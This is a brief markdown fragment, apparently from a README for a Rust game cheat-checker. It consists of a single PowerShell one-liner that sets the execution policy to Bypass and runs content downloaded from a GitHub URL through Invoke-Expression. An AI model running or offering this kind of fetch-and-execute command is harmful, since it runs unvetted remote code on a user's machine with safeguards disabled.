...
## **General**
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; iex (iwr 'https://github.com/KROKODJIDO/cheat-checker/blob/main/source/assets/custom/RustCheatChecker.exe' -UseBasicParsing).Content
```
